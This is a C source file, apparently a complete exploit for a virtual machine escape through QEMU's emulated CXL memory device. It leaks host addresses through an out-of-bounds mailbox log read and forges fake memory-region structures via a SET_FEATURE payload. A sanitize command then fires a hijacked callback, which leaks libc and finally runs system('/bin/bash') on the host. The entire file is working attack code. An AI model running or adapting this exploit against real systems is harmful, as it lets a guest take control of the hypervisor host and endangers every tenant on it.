#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <limits.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define PCI_COMMAND             0x04
#define PCI_COMMAND_MEMORY      0x0002
#define PCI_COMMAND_MASTER      0x0004

#define CXL_MAILBOX_REGS        0x88
#define CXL_MBOX_CTRL           (CXL_MAILBOX_REGS + 0x04)
#define CXL_MBOX_CMD            (CXL_MAILBOX_REGS + 0x08)
#define CXL_MBOX_STS            (CXL_MAILBOX_REGS + 0x10)
#define CXL_MBOX_PAYLOAD        (CXL_MAILBOX_REGS + 0x20)
#define CXL_BAR2_MAP_SIZE       0x1000

#define CXL_MBOX_SUCCESS        0x00

#define LOGS                    0x04
#define GET_LOG                 0x01
#define FEATURES                0x05
#define SET_FEATURE             0x02
#define SANITIZE                0x44
#define MEDIA_OPERATIONS        0x02

#define SET_FEATURE_HDR_LEN     0x20
#define SET_FEATURE_INITIATE    0x01
#define RANK_SPARING_SET_VERSION 0x01

#define MEDIA_OP_CLASS_SANITIZE 0x01
#define MEDIA_OP_SAN_SUBC_SANITIZE 0x00

#define CXL_MBOX_BG_STARTED     0x01

#define GET_LOG_OOB_BASE_OFFSET 0x10000

#define FAKE_FLATVIEW_OFF       0x54e
#define FAKE_DISPATCH_OFF       0x58e
#define FAKE_SECTION_OFF        0x5ce
#define FAKE_MEMORY_REGION_OFF  0x62e
#define FAKE_OPS_OFF            0x74e
#define FAKE_BITMAP_OFF         0x7ae
#define FAKE_COMMAND_OFF        0x7b6
#define RIP_SMASH_DATA_LEN      0x7c0

#define CXL_STATIC_VMEM_SIZE    0x10000000
#define CXL_CACHELINE_SIZE      0x40

#define QEMU_PACKED __attribute__((packed))

static int enable_pci_memory_decode(const char *dev_path)
{
    char path[PATH_MAX + 32];
    int fd;
    uint16_t cmd;
    ssize_t n;

    snprintf(path, sizeof(path), "%s/config", dev_path);
    fd = open(path, O_RDWR);
    if (fd < 0) {
        printf("[-] open(%s) failed: %s\n", path, strerror(errno));
        return -1;
    }

    n = pread(fd, &cmd, sizeof(cmd), PCI_COMMAND);
    if (n != (ssize_t)sizeof(cmd)) {
        printf("[-] pread PCI_COMMAND failed: %s\n",
            n < 0 ? strerror(errno) : "short read");
        close(fd);
        return -1;
    }

    cmd |= PCI_COMMAND_MEMORY | PCI_COMMAND_MASTER;
    n = pwrite(fd, &cmd, sizeof(cmd), PCI_COMMAND);
    if (n != (ssize_t)sizeof(cmd)) {
        printf("[-] pwrite PCI_COMMAND failed: %s\n",
            n < 0 ? strerror(errno) : "short write");
        close(fd);
        return -1;
    }

    close(fd);
    return 0;
}

static void mmio_write32(volatile uint8_t *mmio, size_t off, uint32_t value) {
    *(volatile uint32_t *)(mmio + off) = value;
}

static void mmio_write64(volatile uint8_t *mmio, size_t off, uint64_t value) {
    *(volatile uint64_t *)(mmio + off) = value;
}

static uint64_t mmio_read64(volatile uint8_t *mmio, size_t off) {
    return *(volatile uint64_t *)(mmio + off);
}

static void mmio_write_bytes(volatile uint8_t *mmio, size_t off,
                             const uint8_t *buf, size_t len)
{
    for (size_t i = 0; i < len; i++) {
        *(volatile uint8_t *)(mmio + off + i) = buf[i];
    }
}

static void mmio_read_bytes(volatile uint8_t *mmio, size_t off,
                            uint8_t *buf, size_t len)
{
    for (size_t i = 0; i < len; i++) {
        buf[i] = *(volatile uint8_t *)(mmio + off + i);
    }
}

static int leak_oob_relative(volatile uint8_t *mmio, uint32_t rel,
                             void *dst, size_t len)
{
    uint8_t tmp[0x800];
    uint32_t aligned_rel = rel & ~3U;
    uint32_t inner = rel & 3U;
    uint32_t req_len = (uint32_t)len + inner;
    struct {
        uint8_t uuid[16];
        uint32_t offset;
        uint32_t length;
    } QEMU_PACKED get_log = {
        .uuid = {
            0x0d, 0xa9, 0xc0, 0xb5, 0xbf, 0x41, 0x4b, 0x78,
            0x8f, 0x79, 0x96, 0xb1, 0x62, 0x3b, 0x3f, 0x17,
        },
        .offset = GET_LOG_OOB_BASE_OFFSET + aligned_rel / 4,
        .length = req_len,
    };
    uint64_t cmd_reg;
    uint64_t sts_reg;
    uint32_t out_len;
    uint16_t ret;

    mmio_write_bytes(mmio, CXL_MBOX_PAYLOAD, (const uint8_t *)&get_log,
                     sizeof(get_log));

    cmd_reg = GET_LOG | (LOGS << 8) | ((uint64_t)sizeof(get_log) << 16);
    mmio_write64(mmio, CXL_MBOX_CMD, cmd_reg);
    mmio_write32(mmio, CXL_MBOX_CTRL, 1);

    sts_reg = mmio_read64(mmio, CXL_MBOX_STS);
    cmd_reg = mmio_read64(mmio, CXL_MBOX_CMD);
    ret = (uint16_t)((sts_reg >> 32) & 0xffff);
    out_len = (uint32_t)((cmd_reg >> 16) & 0xfffff);

    if (ret != CXL_MBOX_SUCCESS) {
        printf("[-] failed to get log\n");
        return 2;
    }

    mmio_read_bytes(mmio, CXL_MBOX_PAYLOAD, tmp, out_len);
    memcpy(dst, tmp + inner, len);
    return 0;
}

static int leak_qemu(volatile uint8_t *mmio, uint64_t *memmove_plt,
                     uint64_t *libc_start_main_got)
{
    uint8_t raw[8];
    uint64_t handler;
    uint64_t qemu_base;

    leak_oob_relative(mmio, 0x80d0, raw, sizeof(raw));

    handler = *(uint64_t *)raw;
    printf("[+] LOGS_GET_LOG handler: 0x%016" PRIx64 "\n", handler);

    qemu_base = handler - 0x047E735; // cmd_logs_get_log
    if (qemu_base & 0xfff) {
        printf("[-] ??? 0x%016" PRIx64 "\n", qemu_base);
        return 1;
    }

    *memmove_plt = qemu_base + 0x0341BB0;
    *libc_start_main_got = qemu_base + 0x01E72FF8;

    printf("[+] qemu: 0x%016" PRIx64 "\n", qemu_base);
    printf("[+] memmove@plt: 0x%016" PRIx64 "\n", *memmove_plt);
    printf("[+] __libc_start_main@got: 0x%016" PRIx64 "\n", *libc_start_main_got);
    return 0;
}

static void hexdump_raw(const uint8_t *data, size_t len, size_t disp_base)
{
    int eliding = 0;
    for (size_t i = 0; i < len; i += 16) {
        int all_zero = 1;
        for (size_t j = 0; j < 16 && i + j < len; j++)
            if (data[i + j]) { all_zero = 0; break; }
        if (all_zero) {
            if (!eliding)
                printf("  \x1b[90m  *\x1b[0m\n");
            eliding = 1;
            continue;
        }
        eliding = 0;
        printf("\x1b[90m  %04zx \x1b[0m", disp_base + i);
        for (size_t j = 0; j < 16; j++) {
            if (j == 8) printf(" ");
            if (i + j < len)
                printf("%s%02x\x1b[0m ", data[i + j] ? "\x1b[97m" : "\x1b[90m", data[i + j]);
            else
                printf("   ");
        }
        printf(" \x1b[90m|\x1b[0m");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            uint8_t c = data[i + j];
            if (c >= 0x20 && c < 0x7f)  printf("%c", c);
            else if (c == 0)             printf("\x1b[90m.\x1b[0m");
            else                         printf("\x1b[91m*\x1b[0m");
        }
        printf("\x1b[90m|\x1b[0m\n");
    }
    if (eliding)
        printf("  \x1b[90m  *\x1b[0m\n");
}

static int trigger_media_operations_sanitize(volatile uint8_t *mmio,
                                             uint64_t dpa_addr,
                                             uint64_t length)
{
    struct {
        uint8_t media_operation_class;
        uint8_t media_operation_subclass;
        uint8_t rsvd[2];
        uint32_t dpa_range_count;
        struct {
            uint64_t starting_dpa;
            uint64_t length;
        } QEMU_PACKED dpa_range_list[1];
    } QEMU_PACKED media_op_in_sanitize_pl = {
        .media_operation_class = MEDIA_OP_CLASS_SANITIZE,
        .media_operation_subclass = MEDIA_OP_SAN_SUBC_SANITIZE,
        .dpa_range_count = 1,
        .dpa_range_list = {
            {
                .starting_dpa = dpa_addr,
                .length = length,
            },
        },
    };
    uint64_t cmd_reg;
    uint64_t sts_reg;
    uint16_t ret;

    printf("\n\x1b[1;96m  >> MEDIA_OPERATIONS / SANITIZE\x1b[0m\n");
    printf("  \x1b[90mclass\x1b[0m      \x1b[93m0x%02x\x1b[0m  \x1b[90msubclass\x1b[0m  \x1b[93m0x%02x\x1b[0m\n",
           MEDIA_OP_CLASS_SANITIZE, MEDIA_OP_SAN_SUBC_SANITIZE);
    printf("  \x1b[90mdpa\x1b[0m        \x1b[92m0x%016" PRIx64 "\x1b[0m\n", dpa_addr);
    printf("  \x1b[90mlength\x1b[0m     \x1b[92m0x%016" PRIx64 "\x1b[0m\n", length);
    printf("  \x1b[90mpayload\x1b[0m    %zu bytes\n", sizeof(media_op_in_sanitize_pl));

    mmio_write_bytes(mmio, CXL_MBOX_PAYLOAD, (const uint8_t *)&media_op_in_sanitize_pl, sizeof(media_op_in_sanitize_pl));

    cmd_reg = MEDIA_OPERATIONS | (SANITIZE << 8) | ((uint64_t)sizeof(media_op_in_sanitize_pl) << 16);
    printf("  \x1b[90mcmd_reg\x1b[0m    \x1b[95m0x%016" PRIx64 "\x1b[0m\n", cmd_reg);
    mmio_write64(mmio, CXL_MBOX_CMD, cmd_reg);
    mmio_write32(mmio, CXL_MBOX_CTRL, 1);

    sts_reg = mmio_read64(mmio, CXL_MBOX_STS);
    ret = (uint16_t)((sts_reg >> 32) & 0xffff);

    if (ret != CXL_MBOX_BG_STARTED && ret != CXL_MBOX_SUCCESS) {
        printf("  \x1b[1;91m<< FAILED\x1b[0m  ret=\x1b[91m0x%04x\x1b[0m\n\n", ret);
        return 2;
    }
    printf("  \x1b[1;92m<< OK\x1b[0m      ret=\x1b[92m0x%04x\x1b[0m  sts=\x1b[90m0x%016" PRIx64 "\x1b[0m\n\n", ret, sts_reg);
    return 0;
}

void trigger_set_feature_rank_raw(volatile uint8_t *mmio,
                                  uint16_t feature_offset,
                                  const uint8_t *data,
                                  uint32_t data_len)
{
    struct {
        uint8_t uuid[16];
        uint32_t flags;
        uint16_t offset;
        uint8_t version;
        uint8_t rsvd[9];
        uint8_t data[0x800 - SET_FEATURE_HDR_LEN];
    } QEMU_PACKED set_feature = {
        .uuid = {
            0x34, 0xdb, 0xaf, 0xf5, 0x05, 0x52, 0x42, 0x81,
            0x8f, 0x76, 0xda, 0x0b, 0x5e, 0x7a, 0x76, 0xa7,
        },
        .flags = SET_FEATURE_INITIATE,
        .offset = feature_offset,
        .version = RANK_SPARING_SET_VERSION,
    };
    uint64_t cmd_reg;
    uint32_t in_len = SET_FEATURE_HDR_LEN + data_len;

    memcpy(set_feature.data, data, data_len);

    printf("\n\x1b[1;96m  >> SET_FEATURE / RANK_SPARING\x1b[0m\n");
    printf("  \x1b[90muuid\x1b[0m       \x1b[95m34dbaf f5-0552-4281-8f76-da0b5e7a76a7\x1b[0m\n");
    printf("  \x1b[90moffset\x1b[0m     \x1b[93m0x%04x\x1b[0m\n", feature_offset);
    printf("  \x1b[90mversion\x1b[0m    \x1b[93m0x%02x\x1b[0m\n", RANK_SPARING_SET_VERSION);
    printf("  \x1b[90mflags\x1b[0m      \x1b[93m0x%08x\x1b[0m  (INITIATE)\n", SET_FEATURE_INITIATE);
    printf("  \x1b[90mdata_len\x1b[0m   \x1b[92m0x%x\x1b[0m\n", data_len);
    printf("  \x1b[90min_len\x1b[0m     \x1b[92m0x%x\x1b[0m  (hdr 0x%x + data)\n", in_len, SET_FEATURE_HDR_LEN);

    printf("  \x1b[90mdata:\x1b[0m\n");
    hexdump_raw(data, data_len, feature_offset);

    mmio_write_bytes(mmio, CXL_MBOX_PAYLOAD,
                     (const uint8_t *)&set_feature, in_len);

    cmd_reg = SET_FEATURE | (FEATURES << 8) | ((uint64_t)in_len << 16);
    printf("  \x1b[90mcmd_reg\x1b[0m    \x1b[95m0x%016" PRIx64 "\x1b[0m\n", cmd_reg);
    mmio_write64(mmio, CXL_MBOX_CMD, cmd_reg);
    mmio_write32(mmio, CXL_MBOX_CTRL, 1);
    printf("  \x1b[1;92m<< sent\x1b[0m\n\n");

    return;
}

static void hexdump_payload(const uint8_t *data, size_t len)
{
    static const struct {
        size_t      start;
        size_t      end;
        const char *col;
        const char *name;
    } regions[] = {
        { 0x000,                  0x2e,                   "\x1b[90m", "zero-init"  },
        { 0x2e,                   0xee,                   "\x1b[37m", "mr-seeds"   },
        { 0xee,                   FAKE_FLATVIEW_OFF,       "\x1b[37m", "region0"    },
        { FAKE_FLATVIEW_OFF,      FAKE_DISPATCH_OFF,       "\x1b[92m", "FlatView"   },
        { FAKE_DISPATCH_OFF,      FAKE_SECTION_OFF,        "\x1b[96m", "Dispatch"   },
        { FAKE_SECTION_OFF,       FAKE_MEMORY_REGION_OFF,  "\x1b[93m", "Section"    },
        { FAKE_MEMORY_REGION_OFF, FAKE_OPS_OFF,            "\x1b[95m", "MemRegion"  },
        { FAKE_OPS_OFF,           FAKE_BITMAP_OFF,         "\x1b[94m", "Ops"        },
        { FAKE_BITMAP_OFF,        FAKE_COMMAND_OFF,        "\x1b[91m", "Bitmap"     },
        { FAKE_COMMAND_OFF,       RIP_SMASH_DATA_LEN,      "\x1b[97m", "Command"    },
    };
    const int nregions = (int)(sizeof(regions) / sizeof(regions[0]));
    int prev_region = -1;
    int in_elision = 0;

    printf("\n\x1b[1m  payload hexdump (%zu bytes)\x1b[0m\n  ", len);
    for (int r = 0; r < nregions; r++)
        printf("%s%-11s\x1b[0m ", regions[r].col, regions[r].name);
    printf("\n\n");

    for (size_t i = 0; i < len; i += 16) {
        int cur = 0;
        for (int r = 0; r < nregions; r++) {
            if (i >= regions[r].start && i < regions[r].end) { cur = r; break; }
        }
        if (cur != prev_region) {
            if (in_elision)
                printf("  \x1b[90m  *\x1b[0m\n");
            in_elision = 0;
            printf("  %s+-- %-11s @ +0x%03zx\x1b[0m\n",
                   regions[cur].col, regions[cur].name, regions[cur].start);
            prev_region = cur;
        }

        int all_zero = 1;
        for (size_t j = 0; j < 16 && i + j < len; j++)
            if (data[i + j]) { all_zero = 0; break; }
        if (all_zero) {
            if (!in_elision)
                printf("  \x1b[90m  *\x1b[0m\n");
            in_elision = 1;
            continue;
        }
        in_elision = 0;

        printf("\x1b[90m  %04zx \x1b[0m ", i);

        for (size_t j = 0; j < 16; j++) {
            if (j == 8) printf(" ");
            if (i + j >= len) { printf("   "); continue; }
            uint8_t b = data[i + j];
            size_t pos = i + j;
            const char *col = "\x1b[90m";
            for (int r = 0; r < nregions; r++) {
                if (pos >= regions[r].start && pos < regions[r].end) {
                    col = b ? regions[r].col : "\x1b[90m";
                    break;
                }
            }
            printf("%s%02x\x1b[0m ", col, b);
        }

        printf(" \x1b[90m|\x1b[0m");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            uint8_t c = data[i + j];
            if (c >= 0x20 && c < 0x7f)       printf("%c", c);
            else if (c == 0)                  printf("\x1b[90m.\x1b[0m");
            else                              printf("\x1b[91m*\x1b[0m");
        }
        printf("\x1b[90m|\x1b[0m\n");
    }
    if (in_elision)
        printf("  \x1b[90m  *\x1b[0m\n");
    printf("\n");
}

static void forge_callback_payload(uint8_t *data, uint64_t rank_host,
                                   uint64_t fn, uint64_t opaque,
                                   uint64_t mr_addr, const char *arg)
{
    uint64_t fake_flatview = rank_host + FAKE_FLATVIEW_OFF;
    uint64_t fake_dispatch = rank_host + FAKE_DISPATCH_OFF;
    uint64_t fake_section = rank_host + FAKE_SECTION_OFF;
    uint64_t fake_mr = rank_host + FAKE_MEMORY_REGION_OFF;
    uint64_t fake_ops = rank_host + FAKE_OPS_OFF;
    uint64_t fake_bitmap = rank_host + FAKE_BITMAP_OFF;
    uint64_t fake_command = rank_host + FAKE_COMMAND_OFF;
    uint8_t *region0 = data + 0xee;
    const uint64_t section_size = CXL_CACHELINE_SIZE;

    memset(data, 0, RIP_SMASH_DATA_LEN);

    *(uint64_t *)(data + 0x2e) = fake_flatview;
    *(uint64_t *)(data + 0xb6) = CXL_CACHELINE_SIZE;
    data[0xea] = 1;

    *(uint64_t *)(region0 + 0) = CXL_STATIC_VMEM_SIZE;
    *(uint64_t *)(region0 + 8) = CXL_CACHELINE_SIZE;
    *(uint64_t *)(region0 + 16) = CXL_CACHELINE_SIZE;
    *(uint64_t *)(region0 + 24) = CXL_CACHELINE_SIZE;
    *(uint64_t *)(region0 + 40) = fake_bitmap;
    region0[0x6c] = 1;

    *(uint32_t *)(data + FAKE_FLATVIEW_OFF + 16) = 1;
    *(uint64_t *)(data + FAKE_FLATVIEW_OFF + 40) = fake_dispatch;
    *(uint64_t *)(data + FAKE_FLATVIEW_OFF + 48) = fake_mr;

    *(uint64_t *)(data + FAKE_DISPATCH_OFF) = fake_section;

    *(uint64_t *)(data + FAKE_SECTION_OFF) = section_size;
    *(uint64_t *)(data + FAKE_SECTION_OFF + 8) = 0;
    *(uint64_t *)(data + FAKE_SECTION_OFF + 16) = fake_mr;
    *(uint64_t *)(data + FAKE_SECTION_OFF + 24) = fake_flatview;
    *(uint64_t *)(data + FAKE_SECTION_OFF + 32) = mr_addr;
    *(uint64_t *)(data + FAKE_SECTION_OFF + 40) = CXL_STATIC_VMEM_SIZE;

    *(uint64_t *)(data + FAKE_MEMORY_REGION_OFF + 80) = fake_ops;
    if (arg) {
        snprintf((char *)data + FAKE_COMMAND_OFF,
                 RIP_SMASH_DATA_LEN - FAKE_COMMAND_OFF, "%s", arg);
        opaque = fake_command;
    }
    *(uint64_t *)(data + FAKE_MEMORY_REGION_OFF + 88) = opaque;
    *(uint64_t *)(data + FAKE_MEMORY_REGION_OFF + 112) = section_size;
    data[FAKE_MEMORY_REGION_OFF + 152] = 1;
    data[FAKE_MEMORY_REGION_OFF + 154] = 1;

    *(uint64_t *)(data + FAKE_OPS_OFF + 8) = fn;
    *(uint32_t *)(data + FAKE_OPS_OFF + 40) = 1;
    *(uint32_t *)(data + FAKE_OPS_OFF + 44) = 1;
    data[FAKE_OPS_OFF + 48] = 1;
    *(uint32_t *)(data + FAKE_OPS_OFF + 64) = 1;
    *(uint32_t *)(data + FAKE_OPS_OFF + 68) = 1;
    data[FAKE_OPS_OFF + 72] = 1;
    *(uint64_t *)(data + FAKE_BITMAP_OFF) = UINT64_MAX;

    hexdump_payload(data, RIP_SMASH_DATA_LEN);
}

void fake_write_call(volatile uint8_t *mmio, uint64_t rank_host,
                     uint64_t fn, uint64_t opaque, uint64_t mr_addr,
                     const char *arg)
{
    uint8_t data[RIP_SMASH_DATA_LEN];
    printf("[*] MemoryRegionOps.write=0x%016" PRIx64 " opaque=0x%016" PRIx64 " mr_addr=0x%016" PRIx64 "\n", fn, opaque, mr_addr);

    forge_callback_payload(data, rank_host, fn, opaque, mr_addr, arg);
    trigger_set_feature_rank_raw(mmio, 0x2e, data + 0x2e, sizeof(data) - 0x2e);
    trigger_media_operations_sanitize(mmio, CXL_STATIC_VMEM_SIZE, CXL_CACHELINE_SIZE);

    printf("[*] waiting.");
    for (int i = 0; i < 8; i++) {
        sleep(1); printf(".");
    }
    printf("\n");
    printf("[*] ok here we go\n");
    return;
}

static int leak_more(volatile uint8_t *mmio, uint64_t ct3d_host,
                     uint64_t rank_host, uint64_t memmove_plt,
                     uint64_t libc_start_main_got, uint64_t *_system)
{
    uint64_t leak_slot = ct3d_host + 0x5400 + 0x240000 + 0x100;
    uint64_t leak_src = libc_start_main_got - (CXL_CACHELINE_SIZE - 1);
    uint8_t raw[8];
    uint64_t libc_start_main;
    uint64_t libcbase;

    fake_write_call(mmio, rank_host, memmove_plt, leak_slot, leak_src, NULL);
    leak_oob_relative(mmio, 0x100, raw, sizeof(raw));

    libc_start_main = *(uint64_t *)raw;
    printf("[+] __libc_start_main: 0x%016" PRIx64 "\n", libc_start_main);

    libcbase = libc_start_main - 0x2A200;
    *_system = libcbase + 0x058750;
    printf("[+] libcbase: 0x%016" PRIx64 "\n", libcbase);
    printf("[+] system: 0x%016" PRIx64 "\n", *_system);
    return 0;
}

int main() {
    volatile uint8_t *mmio;
    uint64_t ct3d_host;
    uint64_t rank_host;
    uint64_t memmove_plt;
    uint64_t libc_start_main_got;
    uint64_t _system;
    int fd;

    setbuf(stdout, NULL);

    if (enable_pci_memory_decode("/sys/bus/pci/devices/0000:35:00.0") < 0) {
        return 1;
    }

    fd = open("/sys/bus/pci/devices/0000:35:00.0/resource2", O_RDWR | O_SYNC);
    if (fd < 0) {
        printf("[-] failed to open. \n");
        return 1;
    }

    mmio = mmap(NULL, CXL_BAR2_MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio == MAP_FAILED) {
        return 1;
    }

    leak_qemu(mmio, &memmove_plt, &libc_start_main_got);
    leak_oob_relative(mmio, 0x90, &ct3d_host, 8);
    rank_host = ct3d_host + 0x6c5762;

    leak_more(mmio, ct3d_host, rank_host, memmove_plt, libc_start_main_got, &_system);
    printf("[*] outside the Wall Maria...\n");
    fake_write_call(mmio, rank_host, _system, 0, 0, "/bin/bash");

    return 0;
}
